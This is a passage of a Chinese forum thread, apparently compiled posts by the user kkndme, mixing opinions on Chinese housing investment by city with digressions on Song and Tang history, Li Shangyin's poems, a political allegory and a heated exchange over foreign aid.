但是老城区的多数老房子都可能面临拆迁，投资老城区的老房子不见得划算，特别是二三线城市的拆迁，离皇帝越远的城市，争取合理补偿越困难。 在中国，普通人手上闲钱不多的人被剥削 抽着雪茄喝着绿茶： 兰州，我近来盛干人民币的贬值力度之强烈 现在手上还有十万的盈余 做什么好呢 咬紧牙关供一套房？买黄金？还是买车呢？ 总之不能空放着， 这样通货膨胀下去，汽车的价格也会涨吗？ kkndme： 买车是消费，不是投资，如果追求享受，可以买车，但不能保值增值。汽车属于工业品，通过扩大生产规模可以使边际成本下降，所以汽车会因为档次的不同有涨有跌。 黄金可以适当配置，但由于黄金的定价权不在国内，所以买黄金有一定的风险。 十几万买房子估计不够首付，除非特别小的城市。但小城市的房产变现起来比较麻烦。 至于古玩字画茅台酒之类的，真假难辨，不是专家很难参与投资，且一般人变现还是很困难的。 所以资金越小，资金实现保值增值越困难。我国实行的高通胀低利率政策，是对手中闲钱不多的普通群众赤裸裸的剥削。而手中闲钱较多的中产阶层，相对好一点，可以投资住宅商铺进行保值增值。 三分天注定，七分靠打拼 汝爱之罪： 从晁错的上位过程可以看出，口才很重要 kkndme： 呵呵，这个也不一定，一个是看老板的风格，一个是看自身的运气。 说汉文帝刘恒去参观皇家动物园（上林苑）就问动物园园长：\"咱们动物园有多少动物啊，都有什么品种啊？\"一下子把园长问晕了，吭吭叽叽答不上来。 这时有个负责老虎的工作人员跑了出来，作了一通汇报，如数家珍，回答的头头是道。刘恒特别高兴，觉得这个管理老虎的工作人员口才特别好，想提拔他当动物园园长。 这时候张释之蹦了出来，对皇帝说：秦朝的时候，赵高口才就特别好，特别巧言善辩，结果忠厚的大臣都被迫害了，天下大乱，秦朝完蛋了。陛下要是提拔这个管理大老虎的人，恐怕所有的大臣都会效仿他，专门学习卡耐基演讲，并且天天琢磨吹牛拍马，就没人真正为皇帝干活了。 结果是可怜的管理老虎的工作人员白高兴了一场，不但没得到奖赏，还得罪了动物园园长。 人的前程有的时候不掌握在自己手里 某城市从外省调来个姓q的一把手。该一把手一上任就把该市原来的骨干公务员全部晾到一边，一概不用，名义上对外宣称的是：领导干部年轻化。提拔了一批没有工作经验刚毕业的博士生当处级干部，大多数30岁还不到。这些人一点工作经验没有，以至于外界都很惊讶，甚至惊动了日本友人。 该一把手正是要用这些毫无工作经验的白纸，第一：人是自己一手提拔的，他能不感激涕零吗？第二：这些人啥也不懂，自己想怎么干就怎么干，这些人听话就行。不这样做，怎么能一手遮天呢？ 一批期望往上爬的老公务员就这样牺牲掉了，而一批新丁就此崛起。人生的前程往往不掌握在自己手里。 河南郑州与洛阳 scdf1234： 楼主，我想咨询一下，像洛阳这样的城市，它的经济在河南是第二位，但又离省会郑州很近，洛阳的房价现在大概是四千多，您认为洛阳的房价上涨的空间大吗？ 谢谢！！！！！！！！！！！！ kkndme： 洛阳只能成为郑州的影子，如果自住，趁早在洛阳买房，以后一定会涨，如果投资，还是在郑州买，郑州的上涨空间，肯定大于洛阳。 不过95年以后，我就再也没去过洛阳，所以洛阳买哪个楼盘升值快，你得自己仔细研究。 杭州 灵魂被枪决： 不知道楼主还在不在，因为只看完前面几页。 我前两天刚定了一套二手房，昨天打了首付款，下星期应该就要办银行按揭手续了。 我一直很想买房，但我LG一直不愿意买房，就在定下这套房子之前他还是很不乐意，但 因为我的坚持，我们终于买了房子了。房子定下后一个石头落地了，但另一个石头有悬 地半空了，因为我们是做个体户生意的，就怕生意有变故贷款接不上（我是个悲观主义 者，总先把最坏情况打算在前）。我们是在杭州，虽然不是市中心，但也算是市区了， 请问楼主能分析一下杭州楼市情况吗？？ 先谢过了，楼主的文章对我启发真的很大 kkndme： 前面说过了，杭州我是当一线城市看的。杭州这个城市，本来就是富人的天堂，房价涨到多高都不奇怪，而且极好变现。所以你根本无须担忧资金问题。 西安与重庆 ttan12345： 用了一整天的时间拜读了楼主的精彩文章，很是佩服！ 印象最深刻的就是北周宇文式和苏的关于贪官的对答，古人真有高人啊！ 感觉楼主知识面相当的宽广，尤其对世界历史比较精通，许多观点非常符合世界发展的规律 关于房产的问题，我也一直认为，最终不是我们小老百姓可以玩的东子，所以能买就 尽早买。看了楼主不止一次给大家推荐去投资西安和重庆的地产，楼主问什么看好西安 和重庆这两个地方，现在各个省会城市哪个不是大兴土木呢？为何西安和重庆会进入你 的法眼？ kkndme： 重庆我就不多说，论述的比较多了，发展重庆是国家战略性的，这是政治任务。 西安是西北地区唯一的大城市（乌市比较特殊，不讨论乌市），教育资源丰富，且房价基数较低，所以说后续发展潜力很大，未来该城市的发展一定会纳入zy的视野 谢国中「空置率」 林语边的鸽子： 谢国中:\"一是加息预期；二是政府对房地产的政策调控力度不改；三是市场对人民币升值的预期减弱；四是参考了实际的供应量，\"到2012年，房地产的空置率会非常高，全中国13亿老百姓要有的房子都有了。\" 谢国忠预测，\"接下来可能会看到交易量一直在增长，而房价却不死不活地拖几年，房地产没有第二场戏了 请问楼主对谢国中的说法怎么看? 谢谢 kkndme： 谢是油价和中国房地产的长期唱空者，从04年开始唱空中国房产。谢的有些话还是很有道理的，但有些预测就另有目的了，毕竟屁股决定脑袋。 今年谢一直呼吁的是加息，兼带唱空房地产，唱空房地产的主要依据是空置率。 谢自己也说中国的房地产最大受益的是zf，但却用空置率给出了一个下跌的结论。 人民币升值，呼吁加息，唱空房地产，摩根史丹利的喉舌作用显而易见的 打工不如有一技之长的小老板 中年不惑吗： 现在他们已经比一般的小白领强了 人力成本只会越来越高 现在去读个技校，当个技工 肯定比一般大学出来强多了 还有一个问题： 一般企业的工资10年没有变 10年前某个职位是5000， 10年后这个职位也是5000； 而在10年间，民工工资可能从1000涨到了3000， 房价更是涨了10倍； 菜价生活用品也翻了数倍 高房价问题其实就是分配问题 如果某个从事的职位10年前和10年后是一样的 那也就相当于这个职位的薪水降了相当多 kkndme： 进不了体制内的，无论是不是大学毕业，凡是有头脑的、懂做生意的，会一技之长的，只要不懒，活的肯定比无特长一般在公司打工的小白领强。 古代也是这样的，街面上卖爆肚的肯定比大户人家厨房里负责切葱的日子过的稳当。卖爆肚的小本生意很累很辛苦，但是有个手艺就不会饿肚子。大户人家切葱的上班期间日子过的比较轻松，甚至收入比卖爆肚的还强点，在大户人家也体面些。但一旦大户人家不要切葱的了，裁员了，这个切葱的出来还真没办法养活自己。 大学文凭顶多算个秀才资格，有这个资格才有机会举士，但是举不了士的，就必须学点技术，否则收入远远赶不上瓦工、电工。 过去的穷秀才，饭都吃不饱，但是社会地位却不差，一旦中了恩科，就是宰相根苗。现在有点不同，进不了体制内，又没点技术，那肯定沦为社会的最底层，不要说买房子了，能不能解决吃饭问题都不一定。 一线、二线的生活 一线和二线选择哪个城市生活，其实就是围城。 在一线打拼，有技术有背景或者机会好的，进了金字塔的中层。对于没背景的，运气差点的，看着没什么希望就离开了，到二线发展，起码二线生活成本还低点。混不下去的离开了，又有大量的打算拼一把的冲进来。 很多人宁可在大城市当底层，也不愿意回小城市。这还是个观念问题。小城市从城东走到城西也就二十分钟，觉得过得太枯草。大城市灯红酒绿的，虽然跟自己其实没多大关系，但是看着就是舒服。 讲故事含沙射影ZG之房子不属于市场经济 不说历史了，讲个故事吧。这个故事纯属虚构，如有雷同，纯属巧合。讲故事麽，就不要和谐了。 传说王安石变法失败，后人小王跑到了海外，发现了大西洲。大西洲正处于混乱阶段，军阀割据，外族入侵。小王是个政治军事天才，煽动农民起义，统一了大西洲政权，建立了大西国。 小王继承了王安石变法的理想，建立了一个中央高度集权，百姓与百姓之间完全消灭差别的理想国家。农场、工厂、商场全部由国家统一经营，老百姓只需要在国家的农场、工厂、商场里快乐打工就行了。老百姓穿一样的，吃一样的，连结婚都是国家给安排。 大西国里有的知识分子认为这样治理国家太机器化了，有违人性。小王同志对这些知识分子很生气。 遥远的东方，有一个白鹿洞书院，书院的院长是个伟大的导师，这个人叫朱熹，此人提出了存天理、灭人欲的理论，给了小王同志治理国家理论上的支持。 于是小王同志大搞禁欲主义，凡是学习过陆九渊、王阳明心学理论的都抓起来改造。 不久，大西国经营的农场、工厂、商场就出了问题。效率特别低，老百姓出工不出力，胡干蛮干的比比皆是，后来出现了大饥荒，饿死了不少人。小王同志干不下去，被人赶走了。 新领导上台后，先把农场划分给农民，提高农民的积极性，先解决粮食问题。但是工厂、商场就比较不好办。 新领导认为，工厂、商场效益低，赔钱是因为负担太重了，城市里的老百姓生老病死都是由国家的工厂、商场负责，国家哪里管的起呢？ 于是新领导就提出给国家的企业减负，给点优惠政策，拿出胡萝卜，让胆子大愿意自己单干的同志们主动离开国家企业。对于很多死活不肯走的同志，新领导强令这些人卷铺盖，国家不再负担这些人的生老病死了。大家自己解决吧，国家不管了。 新领导把还留在国家企业的自己人，定义为内部人员。离开国家企业的，就是外人，定义为社会闲杂人等。 社会闲杂人等，有人欢喜有人忧。有人利用内部人员的关系，大把赚钱，有人跑去给外国人当洋买办赚的也不少，还有的知识分子凭着有点文化，给人打工生活的也不错，反正这些人都挺高兴，比在内部受穷强。当然也有没本事的，就比较惨，生活的比较困难。 新领导看见内部都是自己人了，闲杂人等都清理掉了，于是着手内部改革，凡是稀缺的，与老百姓生产生活密切相关的行业，都由内部来经营，不需要动脑子搞创新，只要定个价，老百姓就必须得接受。 而需要创新动脑子的产业，不具备稀缺性必须充分竞争的产业，不是跟老百姓生产生活密切相关的产业都交给社会闲杂人等去自由竞争。 相当于把肉都留给了内部自己，把骨头扔给了外部闲杂人员。 这样做还有个好处：新领导喜欢内部自己人直接跟外国人做生意，但是只要跟外国人做生意就赔钱，赔的还不是一点半点。赔的钱从哪里补呢？ 只要通过内部自己人经营的企业，抬高定价，将赔掉的钱转嫁给社会闲杂人等就可以了。 于是，当初离开内部的社会闲杂人等发现，钱也难赚了，生活成本也越来越高了，日子过得变得越来越艰难了。 这时有个傻空跳出来说：我就不信了，市场经济没有只涨不跌的商品。房价肯定会跌。 有个明白人告诉他：市场经济是分品种的。外部社会闲杂人等经营的电脑、电视是市场经济。但是内部人经营的石油、房地产不是市场经济。不能拿市场经济来解释。 这个傻空不信，本来在大西国能买房的，结果一直没买，后来买不起了，只好一直租房住。但是房租老涨价，吃饭越来越困难，一年难得吃两回肉。 什么是好的政策 好的政策就象挂在驴子鼻子上的胡萝卜，让人永远有希望，但是拼命追也吃不到。这就是中国政治家的最高智慧。 洋人进北京，老佛爷把义和团推出来，结果拳匪搞的鸡飞狗跳，没法收场。 保钓也打算发动群众，靠爱国激情转嫁矛盾。不过好像这招不灵了。老板怎么对待员工，员工就会怎么回报老板。 李商隐「渣男」祖师爷 中秋节将至，撇开房地产的涨跌。喝一壶好酒，聊聊古人。 云母屏风烛影深，长河渐落晓星沉。 嫦娥应悔偷灵药，碧海青天夜夜心。 借着中秋节的千古名句，我们八卦一下李商隐。 李商隐帅哥很有女人缘，据说谈了n多次荡气回肠的恋爱，不过这些恋爱经历没记录进正史，而是唐代的八卦记者通过李商隐帅哥的文学作品，侦破出来的。 李商隐帅哥不光会写诗，年轻人还在玉阳山修习过道术。但是当道士期间并没有认真的清修，以李帅哥的魅力，竟然吸引了一个美丽多情的女道士的目光。 这个女道士叫宋华阳，本来是个侍奉公主的宫女，跟随公主进山当了女道士。两人邂逅于山中，缠绵悱恻，但终究没有结果，宋美眉怀了李帅哥的宝宝，李帅哥也被轰下了山。但好像李帅哥也没负什么责任。 李帅哥伤痛的写下了\"无题\"以示纪念： 昨夜星辰昨夜风， 画楼西畔桂堂东。 身无彩凤双飞翼， 心有灵犀一点通。 隔座送钩春酒暖， 分曹射覆蜡灯红。 嗟余听鼓应官去， 走马兰台类转蓬。 李帅哥的第二个女朋友，被八卦记者们认为是锦瑟，锦瑟是谁？八卦记者们认为是令狐楚家的一个美丽温婉的侍女。 李帅哥很有才华，但是在晚唐时代，有点生不逢时。当时牛僧孺和李德裕搞党争，李帅哥跑去给牛党的重要人物令狐楚当幕僚，结果泡上了令狐大人的侍女。这个李帅哥和锦瑟谈恋爱的证据是根本没有。八卦记者是根据李帅哥的诗找到的蛛丝马迹。 这首诗就叫锦瑟。 锦瑟无端五十弦，一弦一柱思华年。 庄生晓梦迷蝴蝶，望帝春心托杜鹃。 沧海月明珠有泪，蓝田日暖玉生烟。 此情可待成追忆，只是当时已惘然。 春 风光冉冉东西陌，几日娇魂寻不得。 蜜房羽客类芳心，冶叶倡条遍相识。 暖蔼辉迟桃树西，高鬟立共桃鬟齐。 雄龙雌凤杳何许？絮乱丝繁天亦迷。 醉起微阳若初曙，映帘梦断闻残语。 愁将铁网罥珊瑚，海阔天宽迷处所。 衣带无情有宽窄，春烟自碧秋霜白。 研丹擘石天不知，愿得天牢锁冤魄。 夹罗委箧单绡起，香肌冷衬琤琤佩。 今日东风自不胜，化作幽光入西海。 夏 前阁雨帘愁不卷，后堂芳树阴阴见。 石城景物类黄泉，夜半行郎空柘弹。 绫扇唤风阊阖天，轻帏翠幕波洄旋。 蜀魂寂寞有伴未？几夜瘴花开木棉。 桂宫流影光难取，嫣薰兰破轻轻语。 直教银汉堕怀中，未遣星妃镇来去。 浊水清波何异源，济河水清黄河浑。 安得薄雾起缃裙，手接云輧呼太君。 秋 月浪衡天天宇湿，凉蟾落尽疏星入。 云屏不动掩孤嚬，西楼一夜风筝急。 欲织相思花寄远，终日相思却相怨。 但闻北斗声回环，不见长河水清浅。 金鱼锁断红桂春，古时尘满鸳鸯茵。 堪悲小苑作长道，玉树未怜亡国人。 瑶琴愔愔藏楚弄，越罗冷薄金泥重。 帘钩鹦鹉夜惊霜，唤起南云绕云梦。 璫璫丁丁联尺素，内记湘川相识处。 歌唇一世衔雨看，可惜馨香手中故。 冬 天东日出天西下，雌凤孤飞女龙寡。 青溪白石不相望，堂上远甚苍梧野。 冻壁霜华交隐起，芳根中断香心死。 浪乘画舸忆蟾蜍，月娥未必婵娟子。 楚管蛮弦愁一概，空城罢舞腰支在。 当时欢向掌中销，桃叶桃根双姊妹。 破鬟倭堕凌朝寒，白玉燕钗黄金蝉。 风车雨马不持去，蜡烛啼红怨天曙。 这是李帅哥写的燕台诗四首。 有个叫柳枝的美女，是洛阳大富翁的女儿，吟唱了这首诗后，就爱慕上了李帅哥。这个美女很大胆主动跟李帅哥约会，并没有嫌弃李帅哥没车没房，但不幸被李帅哥放了鸽子。李帅哥其实很喜欢这个柳枝，事后非常后悔，准备把失去的爱情找回来，但是柳枝已经给有权有势的大佬做了妾。 飒飒东风细雨来，芙蓉塘外有轻雷。 金蟾啮锁烧香入，玉虎牵丝汲井回。 贾氏窥帘韩掾少，宓妃留枕魏王才。 春心莫共花争发，一寸相思一寸灰。 这首诗名为\"无题\"，写得是荷花。荷花是民间传说中李帅哥又一个女朋友的名字，也是李的初恋。美丽的荷花陪李帅哥进京赶考，半路上得了重病，李帅哥天天陪伴着她，但不幸的是，荷花还是香消玉损。李帅哥悲痛不已，常常以荷花为题，以纪念此段恋情。 李帅哥的才华，被节度使王茂元看中了，把女儿嫁给了这位帅哥。李帅哥娶了这位娇妻的同时，也给自己带来了麻烦。 原因是王茂元是李党的重要人物，而李帅哥的老师令狐楚却是牛党的重要人物。娶了王美人，李帅哥掉进了牛、李两党的夹缝，于是前途杯具了。 这个故事告诉我们，如果有个老大罩着你，日子过的还不错，就千万别轻易向老大的对手抛媚眼。否则，只能是杯具。 李帅哥尽管前途杯具了，但是跟娇妻王氏感情很好，王氏突然病逝，李帅哥伤痛万分，写下了\"悼伤后赴东蜀辟至散关遇雪\" 剑外从军远，无家与寄衣。 散关三尺雪，回梦旧鸳机。 无题 相见时难别亦难，东风无力百花残。 春蚕到死丝方尽，蜡炬成灰泪始干。 晓镜但愁云鬓改，夜吟应觉月光寒。 蓬山此去无多路，青鸟殷勤为探看。 夜雨寄北 君问归期未有期， 巴山夜雨涨秋池。 何当共剪西窗烛， 却话巴山夜雨时。 读这两首诗，第一个感觉就是李帅哥的用情之深，令人叹为观止；第二个感觉就是，其克女朋友的本事，也令人叹为观止啊 将近中秋，闲扯了一通李商隐，就以李商隐的无题结束这个闲话吧。 凤尾香罗薄几重，碧文圆顶夜深缝。 扇裁月魄羞难掩，车走雷声语未通。 曾是寂寥金烬暗，断无消息石榴红。 斑骓只系垂杨岸，何处西南待好风。 重帏深下莫愁堂，卧后清宵细细长。 神女生涯元是梦，小姑居处本无郎。 风波不信菱枝弱，月露谁教桂叶香。 直道相思了无益，未妨惆怅是清狂。 西五环内的别墅，是相当稀缺的资源 黎 明中的星光：** 楼主，认真阅读您的帖子快两周了，以史为鉴，深入浅出，感觉受益匪浅！ 这两天，也在为在北京买房子的事很纠结，请您指点一二： 为自住，我们最近要买房了，此前，已经关注一年了，一年中，看上的房子都翻了倍。 最近我们在西四环西五环之间选了一个低密度花园别墅，叠层，新房，小区面积不大，只有200多户，（第一期08年开盘，大约2万上下单价，已入住，这次是二期）。小区密度是1.0。一期为3到5层，2期为5层坡屋顶。小区本身绿化环境不错，堪称绿意盎然，对内部环境很满意，我们选的是1、2层叠层带小花园的房子，220平方米左右。 这个小区叫：\"金隅—长安山麓\"，您从网上可以查到。 目前价格均价37000元左右。年初开盘时31000左右。开发商的策略是每次小部分放量，慢慢卖，拉开每栋楼开盘时间。最近我们看上的这个，是8月份开盘的。 我们认为优点是： 1、低密度带花园；这在大都市太难得了。 2、周围绿色环境好，多。向北是香山方向，一路绿色。 3、距离石景山万达距离近，3公里左右吧。万达出现在哪里，哪里基本是一个商业服务中心了。 缺点是： 1、周围没有紧密连接大型服务超市，商场等。最近的沃尔玛在2公里以外。 2、周围环境还不够理想。饭后散步、娱乐休闲的地方几乎没有。 担忧和想咨询您的问题是： 1、现在出手买，是否太冒险？ 2、您对这个小区的前景判断如何？ 3、我有朋友说买市中心的高层更好，万一卖掉也方便。怕这里以后不好出手。 楼主，再次打扰，百忙中能帮分析下吗？不胜感谢！ kkndme： 关于西五环内的别墅，是相当稀缺的资源，相当于奢侈品，奢侈品是不会随着调控有大幅度的调整，可以参考收藏品的投资，收藏品的风险在于战乱发生或者**经济崩盘。 \"奸臣\"贾似道 说一个存在争议的人物，这个人被宋史写入\"奸臣传\"，就是大名鼎鼎的贾似道。几乎所有人眼中的贾似道都是大奸贼的形象，仗着是贵妃的姐姐，由一个游手好闲不学无术的二流子，摇身一变成了飞扬跋扈的大汉奸。他贪污受贿，搜罗奇珍美女，蒙古人打过来媚外卖过，还向皇帝谎报军情，最后南宋在他手里灭亡。反正老百姓眼中奸臣能干的所有坏事，都安在了贾似道的头上，然而历史真的如此吗？ 经过多方面史料对照，读书仔细的筒子会发现，宋史的说法并不可信，自相矛盾的地方太多，几乎可以说宋史几乎收罗的都是野史和民间传说。是什么原因使一部正史却采用了大量的野史资料呢？ 原因只有一个，贾似道得罪的人太多。 贾似道得罪人的原因，在于推行了一个政策：公田法。推出的背景是连年征战，南宋需要庞大的军费开支。军费的开支从哪里来呢？当然是从最底层的农民的肚子挤出来。南宋的经济已经是非常困难了，巧妇难为无米之炊，于是zf推出了纸币，相当于给人民打白条，可见纸币并不是现在的专利。这就是恶性通货膨胀。眼看国家经济崩盘了。贾似道想的办法就是：公田法。 公田法的意思跟傻空说的把多军的财产充公的意思差不多，就是限制地主的田地，凡是超过标准的，超过部分的三分之一充公给zf，zf给佃农耕种，产出的粮食用于军粮。有点相当于物业税的意思。 就凭贾似道想出的这个政策，说贾似道是个不学无术的混混，说什么我也不会相信的。 贾的办法很大程度上缓解了南宋经济的彻底崩盘，延缓了南宋生存的时间，但是贾却得罪了几乎所有的地主士大夫阶层。 贾不是一个贤臣，但绝非二流子，政治上也许不够成熟，但是为了南宋的艰难维持也算是呕心沥血。关于向蒙古大军求和，也并不能就说明他是个汉奸，那样一个经济崩溃，军队毫无战斗力的朝廷，你让他硬着头皮打，下场也就相当于鸦片战争。当然，关于宋史里讲到的贾似道极尽献媚之能事，把汉奸表演得淋漓尽致，应当是士大夫出于地主阶层对公田法的憎恨，狂泼的屎盆子。因为宋史的记录实在是疑点颇多。 南宋的将领如范文虎、夏贵之流，才真是腐败透顶，拥兵自重，对抗元军极尽脚底抹油之能事，而贾似道能够亲自督师，所以说贾似道是个大汉奸，实在开玩笑有点过火。南宋灭亡了，元世祖抓了南宋投降的将领问话：你们为什么这么容易就投降了呢？ 降将回答：都是贾似道，只重视文官，不重视我们，所以就投降了。 元世祖哈哈大笑：就你们这样的武将，贾似道能重视你们才怪。 贾似道最后被郑虎臣擅自给杀了。郑虎臣是个大地主，自己的利益被公田法害得不轻，恨透了贾似道。 贾似道死了，全体士大夫阶层拍手称快，并且把他列入了奸臣传，永世不得翻身。 全因为一个公田法。 关于拆迁 关于拆迁，我国只有一部91年颁布的拆迁管理条例，但是就是这个简单的东西，很多拆迁时并不遵守。 常规来说，拆迁应持有拆迁许可证，开发商的开发项目应通过规划局的审核（这个可以在规划局查到），如果连开发商是谁，有没有资格开发都不知道就奇怪了。 是否同意拆迁取决于拆迁户和拆迁方的博弈，但是拆迁补偿办法一定要具体详细，包括如何补偿，过渡期的约定，具体要有时间和操作办法，还要签订违约责任。关于协议不可能只留在拆迁方手中，这是不合法的。 暴利拆迁，zf侵害拆迁户的利益的例子比比皆是，关键是自己如何争取主动。 保钓事件之死要面子活受罪 保钓事件，既定对策就是争取更多小国穷国的舆论支持，减免他国债务，加大对外经济援助。钱的来源，要靠底层国民勒紧裤腰带。 自古以来，泱泱大国，威仪四海，对外\"恩\"显示国力强大，对内\"威\"显示权力强大，恩威并施，千古国策。 朱棣的恩泽海外，死要面子，是做的比较极致的。结果是国库空虚，人民吃饭一下成了问题。所以才有后来坚定的禁海。 如果开通海外贸易，不是为了皇帝的面子，而是为了充实国库和老百姓的腰包，明代的官僚就不会坚持禁海，中国的历史就会改写。 郑和下西洋，反而堵塞了中国通向大海的道路。 tjOOSAN 我只能说，楼主不懂政治，就触及了。钓鱼岛就算所有您所谓的\"小国\"都支持。也没用啊。神经病 就是神经病 kkndme 这个做法不新鲜，从周恩来时期，我们的外交政策就是拉拢第三世界国家的选票，远到非洲拉美，近到越南缅甸柬埔寨，支援铁路基建，捐钱捐物，自认第三世界国家的带头人。但是第三世界国家基本有奶就是娘。比如拉美的苏里南，我国刚捐了钱物，米国给了点好处，马上又投向米国。 tjOOSAN 建议您看看nhk的中国力量。真实偷拍的中国在非洲都做了什么。 1、资源。铁矿石 2、建立国家通信网 3、人力。 呵呵。援助是拉拢，但是有条件的。 越南最新的高铁，由日本公司建设。中国从来没援建过越南。 唉。。。。你把中国当傻子了。 kkndme 周时代，越南的生产工具、军火、粮食，都是中国无偿援助。无知不可怕，无知还满嘴喷粪最可怕 tjOOSAN 呵呵！ 援建越南？？！哪了？给我证据？！？ 关于非洲，我给你们穿了视频！自己看就知道了 中年不惑吗 还非洲的力量 当年红太阳把大米鸡蛋东方红拖拉机运到阿尔及利亚 换来的是\"中国人民是我们最好的朋友\"和对中国各种口头的声援 这和kkndme兄说的难道不一致吗 现在不给钱给物了 你还能听到\"中国人民是我们最好的朋友\"的说法吗？ 拉拢非洲小兄弟，是具有政治意义的 你英国是一票，人家再穷的小国也是一票 kkndme 你理解力看来真有问题，你哪只眼睛看到争取小国穷国的舆论支持里面，包括越南。 这个事是温总定的调子，挂在搜狐首页 tjOOSAN 中年！kk！！ 你们这两个同学啊！一看就跟成天上网的学生，没两样。争来争去。 哎呀，非要你赢他输。 唉。。。你说的怎么就对呢？？！证据！！明白吗？？ 光你自己打嘴炮。没用啊！ 呵呵 我得出去玩会了 你们继续网络吧！~~ 两个宅男 kkndme tjOOSAN你去图书馆查查当年的报纸，什么都清楚了。 典型的愚民政策教育出来的傻蛋。 中国的房地产不可能软着陆 中国的房地产不可能软着陆，甚至也不可能出现日本的硬着陆。一旦积蓄的问题爆发，会直接崩，崩的绝不会只是房地产。那时候绝对没有人会关心房价，很多人将庆幸于当天能够勉强填饱肚子，但绝不奢望还能见到第二天的日出。 xiangshangpa 请教楼主，如果出现您说的大部分老百姓勉强甚至不能填饱肚子，房价没人关心的时候，也就是社会动荡的时候，作为您这样的中产以上的阶级，还没有移民，如何自保？我很感兴趣，谢谢！祝中秋快乐！ kkndme 这种事要静观其变，所谓山雨欲来风满楼，发生之前一定会有大的征兆。 自保是没**有办法的，只能看形势不对，脚底抹油。 xxx 按照我的理解，在发生很大征兆之前，党国就会采取措施，实施闭关锁国政策（倒回50年代），跑是跑不掉的，如果大量难民出去，也没有几个国家会接受，中产，富裕阶层也不例外，现在很多国家已经提高移民门槛了，我对这种情况的出现感到悲观，调适空间十分有限，权贵集团真的是永远无法满足，唉 kkndme 呵呵，人的命，天注定，自求多福吧。 中年不惑吗 我倒没有kkndme兄那么悲观 去看看美国20世纪30年代的新闻和文章 也是一片哀嚎 资本主义已经完蛋了，无可救药了 贫富差距太大，老百姓活不下去了 美国当时的知识界很多人都是向往苏俄模式的 左倾的名流非常多（包括卓别林和爱因斯坦等等） 即使到了20世纪50年代，美国还要搞麦卡锡主义 也说明了当年左倾很有市场 现在了，苏俄成为历史，资本主义反倒越活越精神了 还有就是如果在南北战争的时候想象一个黑人能当总统 人家肯定说你是凡尔纳 就是马丁路德的时候 也只是奢望能给黑人争取公平和权益 社会进步总是靠人推进的 可以是谭嗣同蔡锷，也可以是邹容和陈天华 何必太悲观了 难道不是事在人为吗 自己都不努力改变 怎么能埋怨前辈的选择错误不作为了 关于购买经济适用房 大学生007 楼主你好，质询个问题： 我家要买个二手房，房子是经济适用房，房产证上写的是土地划拨，中介说买了之后就是商品房了，那买了以后房产证上写的还是不是划拨啊，如果以后遇到拆迁什么的是不是补偿跟人家正规商品房不一样啊？谢谢 kkndme 经济适用房需要补交土地款后才能上市销售，补交土地款后，就变成了商品房，所以不用担心。 购买经济适用房一定要把补交的地价款算进去，才知道房价是否高于或低于周边商品房楼盘。 我国房地产交易很不规范，特别是中介有很多办法欺骗客户，买房无论是自住还是投资都要多长几个心眼。 地级市买房 我是射手520 楼主，您好。有幸看到您盖的楼，您对历史、政治和经济的研究让我如醍醐灌顶，很多隐约迷惑的东西，似乎有了出路能去寻找答案。万分感谢。 说到置业，您对一线二线城市谈的较多，想听听您对类似我们这样城市楼市和经济的看法。 我所在的是地级市，离您帖子提到的武汉有500公里。我所在的地市以汽车工业为主导，是三大汽车集团其中之一的发源地，目前是该企业的商用车基地。 在全省范围，离省会最远，但是在城市建设、居民生活水平、物价和房价可以排在全省前面，以前分析是因为我们这里是以工业为主，故经济发展比其他以农业为主的地市发展的要好，看了楼主的帖子，感觉跟离武汉最远也有关系。 我们当地最贵房价从05年前2000以内，到09年3000-4000元，到今年的5000元，最贵的6000元。 房价的飙升一方面随着全国大环境有关，我分析同时跟当地政府的发展思路密不可分，05年开始引进外地大开发商，新修了很多路，其中跟旧城区主干道平行的最重要的一条路，随着市政府入住，体育馆、美术馆，大开发商进驻，经过5年发展，该路段已经成为我们这里房价最贵的一条路，我们是小城市，在这里买房子的，除了投机成分以外，大部分应该是改善型住房，要大型小区，要绿化，这条路目前房子也是越盖越高。通过建设，当地政府财政也充裕，明显感觉对市政投入也大多了。 我们这里养老还是不错的，山多，空气好，工业城市，经济发展也交好。 我目前的置业状况是，在老城区广场旁边有单位分高层住宅一套，虽然是塔楼，但在广场旁边，弱化了容积率高，当年放弃了单位地段相对没这个中心，总价低的多层住宅，就是看中了地段，这个投资较成功，按照现在市价，房屋总价基本翻番，该房屋目前由父母住。 08年底，在开始说的新地段够买一套房屋，120平米，多层住宅，周边政府规划为大学城，周边有两所大专院校，对于该房屋地段较为满意，虽然比不上新修的路的北边和中部靠近体育馆，靠近政府地段升值快，但较看好该地段前景，该地段新修了 一条连接老城区的通道，唯一不太满意是购买的顶楼，因为是购买的该小区的多层住宅没有电梯，如果有了孩子，住顶楼生活就不太方便。购入均价2900，目前周边的新盘均价4500元，该楼盘创造了摇号去选房的记录。该套房屋自住，当年购买房屋没有多贷款一步到位，现在如果想换个满意的难度就大的多，满意的房屋都5000往上了。这套房屋有15万左右的贷款。 虽然很看好武汉的楼盘，远远现阶段大于经济承受能力，目前放弃。 对于我们当地的楼盘，也超出了我们这种普通人的能力，虽然最近楼盘都卖的很火。 好在单位公积金较多，我打算收复30%，剩下用公积金贷款，再购置一套房屋，怕再过一段时间，我的改善型需求就满足不了。 前一段时间，有个机会，但是考虑按照目前房价，30%首复，要耗尽目前自己和家人积蓄，犹豫中，错过了机会。 目前这种状况，不知道是否该再次买房？ 再次买房考虑标准时什么？我不太喜欢高层，但是原中心城区，没有大盘，都是单位或者小开发商盖的，基本没有绿化，在中心城区边上也有了一套高层住宅。 考虑学位房？我们城市不大，目前这套中心城区房屋虽然没有画片在最好的小学中学，但是离这些学校距离比较近。 在靠近那条政府搬入的路的北边靠近体育馆、美术馆（同时也靠近两所重点高中）地方置业，那里房价已经5000多，年底开盘的都是30层以上的高层，自住又不太考虑高层，总价也超出了承受范围。 在当地，离那个大企业居住地，区政府也新开了一条路，那条路待开发状态，据说区政府要搬过去（要搬也是2年以后，现在那条路只有一个大开发商在开发），那条路开车到市中心20分钟，那次有机会买的就是那个大开发商的楼盘，主推多层住宅并且带电梯，去年就预售完毕，这次犹豫中，错过了，住宅品质较好，目前地段太偏。 如果再有机会，该如何选择呢？ kkndme 地级市选房是比较麻烦的，因为投资风险要大于一线城市和省会城市。 地级市的购房需求，主要是以改善性需求为主，追求的是大盘，低密度，低楼层，高绿化，最好有个江景或者水景，环境优美的别墅是首选。 因为低级市城市较小，绝对的城中心如果环境比较嘈杂，小区不够高档最好不要选择。没有实力购置别墅，可以选择环境优美的高端住宅，最好是品牌大盘，一眼能够让人赏心悦目。","tags":"房地产","url":"/yq-doc-source-doc-other-home-price.html","loc":"/yq-doc-source-doc-other-home-price.html"}]};